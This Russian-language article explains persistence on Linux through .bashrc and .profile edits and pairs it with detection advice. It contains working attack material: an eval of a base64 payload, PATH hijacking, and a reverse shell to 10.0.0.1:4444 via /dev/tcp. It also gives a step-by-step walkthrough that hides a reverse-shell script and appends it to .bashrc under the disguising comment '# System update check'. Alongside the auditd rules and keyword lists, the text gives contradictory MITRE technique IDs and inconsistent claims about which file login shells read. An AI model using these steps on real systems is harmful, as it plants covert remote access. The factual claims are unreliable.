# Модификация шелл-конфигов .bashrc и .profile как вектор закрепления в Linux

## Контекст и базовые понятия: природа шелл-конфигов и их роль в persistence

Закрепление (persistence) в контексте тестирования на проникновение и реагирования на инциденты представляет собой набор техник, позволяющих злоумышленнику сохранять доступ к скомпрометированной системе после перезагрузки, смены паролей или перезапуска процессов. В операционных системах семейства Unix/Linux одним из наиболее распространенных и эффективных векторов закрепления является модификация файлов конфигурации оболочки (shell configuration files). Этот метод относится к тактике **T1053.007** (Scheduled Task/Job) или **T1546.004** (Event Forwarding/Trigger) в классификации MITRE ATT&CK, хотя чаще классифицируется как **T1546.004** (Unix Shell Configuration) или просто **Unix Shell Configuration Modification**.

Файлы `.bashrc` и `.profile` (а также `.bash_profile`, `.bash_login`) являются скриптами, которые выполняются оболочкой Bash при определенных условиях. Их модификация позволяет внедрить произвольный код, который будет выполняться в контексте пользователя каждый раз при открытии новой сессии. Это обеспечивает автоматический запуск вредоносного payload, установку переменных окружения, перенаправление вывода или загрузку вредоносных библиотек.

Ключевое различие между `.bashrc` и `.profile` заключается в триггере выполнения и контексте, что критически важно для выбора вектора атаки и последующего обнаружения.

| Характеристика | `.bashrc` | `.profile` / `.bash_profile` |
| :--- | :--- | :--- |
| **Тип оболочки** | Интерактивная не-login оболочка (interactive non-login shell). | Интерактивная login-оболочка (interactive login shell). |
| **Триггер выполнения** | Открытие нового терминала, запуск `bash -i`, выполнение скриптов (если не отключено). | Вход в систему (SSH, консольный вход, `su -`, `sudo -i`). |
| **Область видимости** | Только текущая сессия оболочки. Не наследуется дочерними процессами, если не экспортируется явно. | Переменные окружения, установленные здесь, наследуются всеми дочерними процессами пользователя. |
| **Частота вызова** | Очень высокая (каждый новый терминал). | Низкая (только при входе в систему). |
| **Риск обнаружения** | Высокий. Изменение файла часто заметно пользователю (например, при открытии терминала появляются лишние сообщения или задержки). | Средний. Менее заметно при беглом использовании, так как выполняется один раз при входе. |
| **Типичное назначение** | Алиасы, функции, настройка prompt (PS1), локальные переменные. | Переменные окружения (PATH, EDITOR), запуск демонов, настройка терминала. |
| **Приоритет загрузки** | Игнорируется, если существует `.bash_profile` или `.profile` (если они не source'ят его явно). | Имеет приоритет над `.bashrc` для login-сессий, если не вызван из `.bash_profile`. |

**Разграничение понятий:**
*   **`.bashrc`**: Файл конфигурации для *интерактивных* оболочек. Если пользователь открывает новый терминал в GUI или подключается по SSH без флага `-l` (login), выполняется только `.bashrc`.
*   **`.profile`**: Файл конфигурации для *login*-сессий. Выполняется при входе в систему. Если существует `.bash_profile`, Bash игнорирует `.profile`. Если существует `.bash_login`, он имеет приоритет над `.profile`.
*   **`.bash_profile`**: Специфичен для Bash. Если он существует, Bash не читает `.profile`. Это создает ловушку: если атакующий создает `.bash_profile`, но не прописывает в нем `source ~/.bashrc`, то настройки из `.bashrc` перестают применяться, что может вызвать подозрения у администратора.

**Почему этот метод эффективен для persistence?**
1.  **Контекст пользователя:** Код выполняется с правами жертвы, что позволяет читать личные файлы, ключи SSH и т.д.
2.  **Легитимность:** Процессы, запускаемые из `.bashrc` или `.profile`, часто маскируются под стандартные системные утилиты или процессы оболочки.
3.  **Устойчивость:** Даже если основной канал связи (например, reverse shell) будет закрыт, при следующем входе пользователя вредоносный код выполнится снова, восстановив доступ.
4.  **Сложность обнаружения:** Изменения могут быть незаметны при беглом просмотре, особенно если атакующий использует обфускацию или маскирует под легитимные настройки.

**Путаница в терминологии:**
Часто `.bashrc` и `.profile` рассматриваются как взаимозаменяемые. Однако их поведение различается в зависимости от того, как была запущена оболочка. Например, при подключении по SSH обычно запускается login-shell, поэтому выполняется `.profile` (или `.bash_profile`). Если атакующий модифицирует только `.bashrc`, он не получит выполнения при SSH-входе, если только `.profile` явно не вызывает `.bashrc`. Это критично для планирования атаки и для детектирования: правило детектирования должно мониторить изменения в обоих файлах.

## Внутреннее устройство: механизмы выполнения и структура файлов

Для понимания того, как именно происходит закрепление, необходимо разобрать внутреннюю логику загрузки конфигурационных файлов Bash и структуру самих файлов.

### Механизм загрузки конфигурационных файлов Bash

Bash использует сложную логику определения того, какие файлы загружать, в зависимости от типа запускаемой оболочки.

1.  **Login Shell:**
    *   Запускается при входе в систему (SSH, `su -`, `sudo -i`).
    *   Порядок чтения:
        1.  `/etc/profile` (системный)
        2.  Первый существующий из: `~/.bash_profile`, `~/.bash_login`, `~/.profile`.
    *   Если ни один из пользовательских файлов не существует, `/etc/profile` не загружает пользовательские настройки.

2.  **Interactive Non-Login Shell:**
    *   Запускается при открытии нового терминала, вызове `bash` из другой оболочки.
    *   Порядок чтения:
        1.  `/etc/bash.bashrc` (системный, если существует)
        2.  `~/.bashrc` (пользовательский)

3.  **Non-Interactive Shell:**
    *   Скрипты, выполняемые без интерактивного режима.
    *   По умолчанию не читает конфигурационные файлы, если не установлена переменная `BASH_ENV`.

**Взаимосвязь файлов:**
Стандартная практика настройки Linux заключается в том, что `~/.profile` (или `~/.bash_profile`) содержит код для инициализации окружения, а `~/.bashrc` — для настройки интерактивного интерфейса. Чтобы обеспечить единообразие, в `~/.profile` часто добавляют блок:

```bash
if [ -n "$BASH_VERSION" ]; then
    if [ -f "$HOME/.bashrc" ]; then
        . "$HOME/.bashrc"
    fi
fi
```

Этот код гарантирует, что при login-сессии также загрузятся настройки из `.bashrc`. Атакующий, модифицирующий `.profile`, должен быть осторожен, чтобы не сломать эту логику, иначе пользователь может заметить отсутствие стандартных настроек (цветов, алиасов).

### Структура и возможности внедрения в `.bashrc`

Файл `.bashrc` — это обычный текстовый скрипт на языке Bash. В него можно вставлять любые допустимые команды.

**Типичные легитимные элементы:**
*   Переменные окружения (`export PATH=...`)
*   Алиасы (`alias ll='ls -la'`)
*   Функции (`function prompt_command { ... }`)
*   Настройка prompt (`PS1`)

**Варианты внедрения вредоносного кода:**

1.  **Прямой вызов скрипта:**
    Добавление строки, вызывающей внешний скрипт.
    ```bash
    /tmp/.hidden/payload.sh &
    ```
    *Плюсы:* Простота, легко реализовать.
    *Минусы:* Зависимость от существования файла, высокий риск обнаружения через мониторинг файлов.

2.  **Inline-код (one-liner):**
    Встраивание кода прямо в файл.
    ```bash
    eval $(echo 'base64_encoded_payload' | base64 -d)
    ```
    *Плюсы:* Не требует внешних файлов, сложнее обнаружить при беглом просмотре.
    *Минусы:* Увеличивает размер файла, может вызвать ошибки синтаксиса при неправильной кодировке.

3.  **Маскировка под легитимные настройки:**
    Внедрение кода в конец файла или в комментарии, которые игнорируются при нормальном использовании.
    ```bash
    # Custom prompt settings
    export PS1="\u@\h:\w\$ "
    # Backdoor
    nohup /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 &
    ```

4.  **Использование переменных окружения:**
    Если атакующий не может писать в `.bashrc`, он может попытаться модифицировать `/etc/environment` или `/etc/profile.d/`, но это требует прав root.

### Структура и возможности внедрения в `.profile`

Файл `.profile` выполняется только один раз при входе. Это делает его более подходящим для инициализации долговременных процессов или настройки окружения, которое должно быть доступно всем дочерним процессам.

**Особенности внедрения:**
*   **Настройка PATH:** Атакующий может добавить свою директорию в начало `PATH`, чтобы перехватывать вызовы стандартных утилит (например, `ls`, `ssh`).
    ```bash
    export PATH="/tmp/.hidden:$PATH"
    ```
    Если в `/tmp/.hidden` лежит вредоносный `ls`, он будет выполняться вместо системного.

*   **Запуск демонов:**
    ```bash
    if [ -f /tmp/.daemon ]; then
        /tmp/.daemon &
    fi
    ```

*   **Перехват вывода:**
    Перенаправление вывода стандартных команд в лог-файл злоумышленника.

**Риски при модификации `.profile`:**
Если атакующий создает `.bash_profile` вместо модификации `.profile`, он должен убедиться, что тот вызывает `.bashrc`. Иначе пользователь может потерять настройки терминала, что привлечет внимание.

### Сравнительный анализ векторов

| Критерий | `.bashrc` | `.profile` |
| :--- | :--- | :--- |
| **Частота выполнения** | Высокая (риск зависания системы при ошибочном коде) | Низкая (безопаснее для стабильности) |
| **Видимость для пользователя** | Высокая (ошибки выполнения видны сразу) | Низкая (ошибки могут быть проглочены) |
| **Сложность обфускации** | Средняя (код виден в файле) | Средняя (код виден в файле) |
| **Эффективность для C2** | Высокая (частые "звонки домой") | Низкая (только при входе) |
| **Рекомендация для атаки** | Для частых проверок доступа | Для инициализации окружения и запуска фоновых процессов |

## Применение и работа с предметом: детектирование и анализ

Для специалистов по информационной безопасности понимание механизмов модификации шелл-конфигов критично для разработки правил детектирования и проведения расследований.

### Механизмы детектирования

1.  **Мониторинг изменений файлов (File Integrity Monitoring - FIM):**
    *   Использование `auditd` для отслеживания записей в файлах `~/.bashrc`, `~/.profile`, `~/.bash_profile`.
    *   Пример правила `auditd`:
        ```bash
        -w /home/*/.bashrc -p wa -k shell_config
        -w /home/*/.profile -p wa -k shell_config
        ```
    *   **Проблема:** Ложные срабатывания при легитимных изменениях настроек пользователем.

2.  **Анализ содержимого файлов:**
    *   Поиск подозрительных паттернов: `eval`, `base64`, `/dev/tcp`, `curl`, `wget`, `nc`, `bash -i`.
    *   Использование инструментов вроде `LinPEAS` или `LSE` для автоматического сканирования.

3.  **SIEM-правила (Elastic/Splunk):**
    *   Правила, основанные на событиях изменения файлов от EDR-агентов (например, Elastic Defend).
    *   Пример запроса Elastic (упрощенный):
        ```kql
        event.category:file and event.type:change and file.name:(".bashrc" or ".profile") and process.name:("vim" or "nano" or "echo")
        ```
    *   **Фильтрация:** Исключение легитимных процессов (git, sudo, стандартные редакторы).

4.  **Анализ переменных окружения:**
    *   Мониторинг изменений `PATH`, `LD_PRELOAD` в процессах оболочки.

### Типичные ошибки и подводные камни

1.  **Игнорирование `.bash_profile`:**
    Если атакующий создал `.bash_profile`, но не добавил в него `source ~/.bashrc`, настройки из `.bashrc` не применятся. Это может быть обнаружено при сравнении с эталонным образом системы.

2.  **Нарушение синтаксиса:**
    Ошибки в скрипте могут привести к тому, что оболочка не загрузится, и пользователь не сможет войти в систему. Это привлекает внимание администратора.

3.  **Ложные срабатывания:**
    Легитимные инструменты (например, `pyenv`, `nvm`) могут модифицировать `.bashrc` динамически. Правила детектирования должны учитывать эти процессы.

4.  **Маскировка под системные файлы:**
    Атакующие могут использовать имена, похожие на системные (например, `.bashrc.bak`, `.bashrc.old`), чтобы скрыть изменения.

### Паттерны использования в расследованиях

При расследовании инцидента, связанного с persistence, следует:

1.  **Проверить все файлы конфигурации:**
    ```bash
    for user in $(cut -f1 -d: /etc/passwd); do
        echo "=== $user ==="
        ls -la /home/$user/.bash* /home/$user/.profile 2>/dev/null
        cat /home/$user/.bashrc 2>/dev/null
        cat /home/$user/.profile 2>/dev/null
    done
    ```

2.  **Сравнить с эталонным образом:**
    Использовать инструменты вроде `Tripwire` или `AIDE` для проверки целостности файлов.

3.  **Анализ временных меток:**
    Сопоставить время изменения файлов с временем компрометации.

4.  **Проверка сетевой активности:**
    Если в файлах есть команды типа `curl` или `nc`, проверить сетевые логи на наличие соединений с подозрительными IP.

## Сквозной практический пример: закрепление через модификацию .bashrc

**Исходные условия:**
*   **Среда:** Linux-хост (Ubuntu 22.04), пользователь `victim`.
*   **Роль:** Пентестер, имеющий доступ к shell пользователя `victim` (например, через веб-уязвимость).
*   **Цель:** Закрепиться в системе так, чтобы при следующем входе пользователя выполнялся reverse shell на C2-сервер.
*   **Инструменты:** `bash`, `nc` (netcat), текстовый редактор `vim` (или `echo`).

**Шаг 1: Анализ текущей конфигурации**
Перед внесением изменений необходимо понять, какие файлы уже существуют и как они настроены, чтобы не сломать работу пользователя.

```bash
# Проверка существования файлов
ls -la ~/.bashrc ~/.profile ~/.bash_profile

# Просмотр текущего содержимого .bashrc
cat ~/.bashrc
```

**Ожидаемый вывод:**
```text
-rw-r--r-- 1 victim victim 3771 Oct 10 10:00 /home/victim/.bashrc
-rw-r--r-- 1 victim victim  807 Oct 10 10:00 /home/victim/.profile
# Содержимое .bashrc: стандартные настройки, алиасы, экспорт переменных
```

**Шаг 2: Создание скрытой директории и payload**
Создадим директорию для хранения вредоносного скрипта, чтобы не загромождать `.bashrc` длинным кодом.

```bash
# Создание скрытой директории
mkdir -p ~/.config/.hidden

# Создание скрипта reverse shell
echo '#!/bin/bash' > ~/.config/.hidden/reverse.sh
echo 'nohup /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 &' >> ~/.config/.hidden/reverse.sh
chmod +x ~/.config/.hidden/reverse.sh
```

**Ожидаемый вывод:**
```text
# Файл создан, права установлены на выполнение
```

**Шаг 3: Модификация .bashrc**
Добавим вызов скрипта в конец `.bashrc`. Используем `echo` для минимизации следов редактирования.

```bash
# Добавление строки запуска payload
echo '# System update check' >> ~/.bashrc
echo 'nohup /home/victim/.config/.hidden/reverse.sh >/dev/null 2>&1 &' >> ~/.bashrc
```

**Ожидаемый вывод:**
```text
# Строка добавлена в конец файла
```

**Шаг 4: Проверка корректности**
Убедимся, что синтаксис верен и файл не сломан.

```bash
# Проверка синтаксиса
bash -n ~/.bashrc

# Вывод содержимого последних строк
tail -n 5 ~/.bashrc
```

**Ожидаемый вывод:**
```text
# bash -n не выводит ошибок (синтаксис верен)
# tail выводит:
# # System update check
# nohup /home/victim/.config/.hidden/reverse.sh >/dev/null 2>&1 &
```

**Шаг 5: Имитация входа пользователя (тестирование)**
Запускаем новую интерактивную оболочку, чтобы проверить выполнение.

```bash
# Запуск новой bash-сессии
bash -i
```

**Ожидаемый вывод:**
На C2-сервере (прослушивающем порт 4444) должно появиться подключение от IP жертвы. В логах системы (если включен auditd) будет зафиксировано изменение файла `.bashrc`.

**Ожидаемый вывод по теме:**
Пример демонстрирует, как простая модификация `.bashrc` позволяет обеспечить persistence. Ключевые моменты: использование скрытой директории, обфускация команды (через `nohup` и перенаправление вывода), проверка синтаксиса для избежания сбоев. Для детектирования необходимо мониторить изменения в `.bashrc` и анализировать содержимое на наличие сетевых вызовов.

## Аналитический вывод

Модификация файлов `.bashrc` и `.profile` является классическим и эффективным вектором закрепления в Linux-инфраструктурах. Эффективность метода обусловлена его способностью выполнять код в контексте пользователя при каждом входе в систему или открытии новой сессии, что обеспечивает устойчивость доступа даже после перезагрузки или смены паролей. Ключевым фактором успеха атаки является правильное понимание логики загрузки конфигурационных файлов Bash: `.bashrc` выполняется для интерактивных не-login оболочек, а `.profile` — для login-сессий. Неправильный выбор файла или нарушение логики их взаимодействия (например, создание `.bash_profile` без вызова `.bashrc`) может привести к обнаружению атакующим из-за изменения поведения системы.

Для специалистов по безопасности критически важно внедрять мониторинг изменений этих файлов на уровне хоста (FIM/auditd) и анализировать их содержимое на наличие подозрительных паттернов (eval, base64, сетевые вызовы). Ложные срабатывания можно минимизировать, исключив легитимные процессы настройки окружения. В условиях современного тестирования на проникновение этот метод часто комбинируется с другими техниками (например, systemd-сервисами или cron-задачами) для обеспечения избыточности доступа. Понимание тонкостей работы шелл-конфигов необходимо как для планирования атак, так и для разработки эффективных стратегий детектирования и реагирования на инциденты.
